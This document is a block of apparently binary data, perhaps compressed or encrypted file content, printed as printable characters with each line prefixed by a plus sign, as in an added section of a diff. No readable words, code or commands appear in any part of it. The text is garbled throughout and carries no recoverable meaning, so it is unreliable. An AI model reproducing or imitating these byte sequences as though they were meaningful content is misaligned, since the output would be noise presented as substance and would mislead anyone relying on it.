+..3X...i...&....*A$...V.K....;....&Wx....Jml.5..WYX..|-3..,..).-2...p.Y...t..B....U...{Y.....Ne.T......@k...F....u.S..PC.Gh!B.C.q..g..{....x...zZV....v.s..H'0(CPG.&..b..&..x.~...mO..y..\>...Yi.K .R..)
+.'.......o.....].p.g|..|..v.../e...59.r....R.<..*f...3..u#eH......(..x.]Q.N[A........ 9......{......bd;...i7r..q..@.D.......H..!.H|B>!.3k..4;;.s..3K...w.k.S.$.....6.NH............Zlf..u.......;j..=o)..M;.Z.....
+.....;..4...:..!...qK...........b00.....?.R..4.j.......3...4@Skm....!..q.K....6....$....tUS.....]...`.*.....Vy....&...$.,...b......
+9.....@.H...IJ;.........6O..<.Mmo...Y..w..K:......b;b)..DBFU.....,..R..@...........D<..u.1V.z~......V...Bwo.j..)..^........Ac.....J..<,.4h..Cz7z........>.'...Z...........x.........<..H.....H..Ve%m...j....W....t...)...0.L.$....1....PG..I..%$pJQ...p..4..r..J.w...}........^K.&.{.{..^....8.|F.p.'q...2.eI........,.<lr%....pY2
+G...........62G....."G.l........e.2N.Z9..h..F..5K4.F....Y.]..l)@:..=.|4UP..\P...U.....T.H..v.P........I..Qz....?z_+..+[8..o.....e.Y:..!...h..f9..Y.\..l.l.Sf..Y..q...;Kv
+].D....!]dD......7....A...,W..pZ6..U.mY........p.d5CFk.i....jJF.V.../T\....V.....PK.>].n....Z..9..~.Y..d.&.k.r......#....B...+....O....x..KQ)jT.-,...|>g...X*MR.......'.~v........-..........A#.......rJh....-.7=Q..u....f..'N.........x.N.....K......X.....~5..V...BF.e.../7...J41S2....V.[.nCr...c....%.....p....U.._Q3%?|.d.dw......#x}.h./.....4....Wu...+...>...tW...~.5~.)..UW<}..g........c.'......"..[8;...Z ..l.Q....."].A~=..F........wx.1.4.F.F.....><.....".sF..qR........!..d'....C.....:.n.....o.......)..v;W.....:?k.....W6"?KUM.id.h.C@..`B.....&.7MF`\+%..%2L.|T.5....@Zm.....E>....L0_..".....0...9)9.Z..MJ..Q..Ql......s..\...X.p..2..8`.......;.3w...K.^.Wh..'...-V....2.R..8..z.]......k.6pe.b..hjUkb.....!M.j..e.f.9...Pd.>.w.[.~. ..s%....._Se...5...N2...=n. .x%..:.1."......s%#*i.Vk^A.$.........../..w...O..s..+w].....H..Z._........?a......s.N....h.!.Q...&....|....+^. ....S.......m....y...wx..[..'..lY.-....D.{..9...xC..S.7.x....7.E..0....,...<Q.1..P8.......5}.=....{....*....&..=...I...7|.... ~....cS
+&R..{T...
+..4.>....;.[..w......Uw...;.....g..w=..y..%.Ho_.."^c\!
+.I...G.. #w.R.?W..i.*......9.......d...;*pM...R\'....qe.9H......RF..4SUk.j....i........#...ZWV.d.tN.V..Y.?..!9..K.Q..3.\.V5....Q..vY.].Uk.w.......km....".R..L.w...P-.QP.. ..M...S.5.P`...2..Oz...Y.%.............K_....../AY
+.....#..ck..h..fss.........d..6HI...1...E.G?..J.@...^.ffK'P.........0..X2@&..O8...PB!E..........6../i..}.xg8...q_...].....k5.Bi......[."%J.......W.~w.t..`..Z:..,Pg..Sr!.......B3@R.Y.........U:..m.../...~..-.C).sa....IbI9...$....!...;.............<.....`.....1^[..A...t./.i.Um>..v:..v2....FT=...6N?z^.....$.....q4.....2....'S.?.;...}..F....SP.ex.........`qH.T.<*d..~.'...t...~..].]$.......
+f...d&.....A.$...[..>.'...k`.......&h....sZ..E.....9.I.xB...j....?.5..I.X....j.l9..K.q.V2...f.VbL.h..N..Q.} .........h..+..u.n.:\...h..8...sMr.. ....{. .sJN.+....!..........."..u.}....;c:.*2U...4..Q.j.}.n.<.V..O...X..b.u.8f.5..k...F.U..U&..."..q...Q].S..A.h..~...#..]t]..e..s..s..*..#O.l..A..Qh2.l....o...T3s...f..,.........K..M`.w..V.......s.l..._....w_.}..uH)..(....i.~.P.Z:r...Rx|X...-p.\Ll.k...E..\*..13...+........D....*.1.Y.:.jI.....6....W.....C_!h.....-oP.V!..\..K..-.N.....VU........R...v..............*.!`...>...GVhu...0,K...K.(0.Ry..M-..}.R.....o..k!.O-.>..eg.}...WH..`3.....RH..T.6.1'ot..QR%#l.P)T..X2h|.w..U.....{...XS&iLg.....J.;..../..*......=...0d.....W..;...\.........IcO.....IB.N......pR..m....rsw...0.6+s..p..w...2.n3d.........o...d......5....q.......8.Z.......".)wd.r..4UA.D.....3.XY.y.<..N....y...P3-'.......\(......J=....z..=[....z=pQ...L.....N.\D.V.....j'.BV....MOm.....@;.j. ...a..-..(.2.>:.}.He....6".Z.....v.^..p.....}p..?0:.?...G..&...........+....|.......&.g#...K....B'....N.~......?~.......(G....(...9..d....X.$.. ..... ..&...6..N:F."...J...8.G..:...+ n.:t......F.Q...(>->.s..<..C..Y..(d...o.*0...rj...v.5W...._...T.Nn..h4..v.S.....U.U.1.N.u....{.gw.)..2..V......v.b..]..........|...G._?........C..E 2..xb...,.......$=Hm...C.g..MQ^.kV..C...rf...I....,.r.&..$'...
+q....E....G.?#.....A[..MO..:T>ZE.......ttv.%\...dw...d.EeY...".D...h...$. .x3H*....z....~J...^.O..(?.7`.7.=G.x B..W).8...}..@.ra......s....B.V.j2[HA.lv.....1.K.,...E.Ju.fY..k.{.........Xs....k+j.0...t)".......Y{.8..........?.@.z....#...|.....x^....v"....u...hS.."&`......1....|.EL....kp...G1.8....Q=hz...`"......#Gv..+.s...I.1....r.5...Z2. _a"....)....[..........s......BN.V..?..v;..J%K.............0..[....[6.Q.......t.P:.........6 .h..>..T....S....$.......C2..O&......Sp.NrO....75sk8t5....-.p.(....U.0~...... z.j...,.....2.>..^...d......D.{......RT.`Uw...(.:......]z/...+..V...]..m.u.............Qx]\...+.8.0.|....../....s.l7..;.n..sPT5.c.`...d\....~....`..~.E......h.Z`..R.a....Hgn;.. G.I.$.rT.e./..y.....-.|..}.}.o/.YLF...v._....xv....O.I.q...k|;./k...2.?.b....Ds..-.E......R.n.....R3.t.lsyQ..V.....Pi........06R./.,.C$.$....F.-G..;.P.......y.....{.c..2.u"..*.]..9.0b.`T.. ....u.............T..R.W6.a....~..q.9..Q.......lYM.Vo....m...$..k._.>PY.e..
+(1{.<..]T......$.\V..F4..&.,.FB...a...IAv..`......n...b{.u...~..^.....a.6.V.D......fYp...LV=.\....]..3H.....j}t.C@..5{.W......u.JY...j.......y...N....j..$...).<^.......u..%3L"a.......W<2sM A.5......R.......t..G.x..G...L{L6.....&...V.u......7....U....U......z/.7l.dyE\/...@o...A6DI.c&*X.)0u.....;...........C...6..rrn..
+.C(..Z ..=Q.;CJ.........h.Z.........}..yo}..-.#.7...7HcW.)..~..C.&xZ`t<f...OeK<.P.sx.?.H4!'....RR.xV.h.......r.t...I..F.............[...yO...w_.e.k*....i.G..T.....g..%..y`.-.V..8.4c>.$.j..g...`...\...r.{9..eJ....A)...%......z...s...%C...............U.<..Jik..A..s..4...c..2.:...W....."l.TK.%..*-.J..j+.....(.N..f.`e.*.@.lT....]nk....R..(.....j\.....o.v.1.|......y..=Q9.G.K..E.:...^..E.U.<...+.... ......@\...."...&#..n.....(<..U....]....x...5...B.......)....^T..VQx.....x3^..Z....|..7.....d3......G..#%...cT{m..C.e@.b..j.:!.)V.5h..a...&...WQH.\.......&..4..1.4#.<)...+.|*...}.>E.2..T*.....-.....i.M.I.5..o..{R...J..*30..\?....g.R....xf.yU_....J.$.V......^....C..C./.'.{6.w'.............}. ...........;3............. .C.*.....Kv?x..E<.%/!DV.$.4...4...a..^....k.....Y&....=......w.h.4.....@........G.E.}.<w...W....=]+Kp?...{.....
+y...R......}.....{..<..T.l6p............Z.I..`.`A.Q..3.,2...F$..5Yq.s.b.....Z<L....-!M.2I(....Z.....P......o.W....,.....M...9l..I.j..k....:.R...m.9....n......[-~...B\......f'..k.h...e`".L..,Z.....l..v-.R............K.)@).........Zbq....\J..0...[...........2-.b...4..C.......l_o2...@..6*F.Dg......zV.j..ZRq.22R1....^O.:x.*L....N.Q...`
+.5#$....
